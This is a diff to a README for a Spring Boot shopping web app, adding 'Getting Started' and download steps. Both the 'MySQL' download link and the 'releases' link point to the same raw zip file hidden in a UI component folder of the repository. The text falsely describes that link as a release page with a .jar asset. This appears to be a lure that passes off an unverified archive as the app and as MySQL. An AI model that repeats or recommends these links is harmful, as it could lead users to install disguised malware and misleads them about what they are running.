@@ -30,3 +30,33 @@ If you don’t have Java or MySQL installed, you can download them for free:
 - MySQL: https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip
 
 ---
+
+## 🚀 Getting Started
+
+This section guides you to download, install, and start using the app step-by-step.
+
+---
+
+## ⬇️ Download & Install
+
+To get the app files, please visit the release page on GitHub by clicking the large badge above or the link below:
+
+**[Download spring-boot-shopping-web releases](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)**
+
+On this page, look for the latest release version. Inside the release, download the `.jar` file. This file contains the app ready to run.
+
+**Steps to download:**
+
+1. Click the link above or the badge at the top to open the release page.
+2. Find the latest release; the releases have dates and version numbers.
+3. Under “Assets”, click the file ending with `.jar` to download it to your computer.
+4. Save it to a folder you can easily access, like your Desktop or Downloads folder.
+
+---
+
+## 🛠️ Setting Up the Database
+
+spring-boot-shopping-web stores data in a MySQL database. You need to create a database and set up a user account to connect the app.
+
+Follow these steps:
+
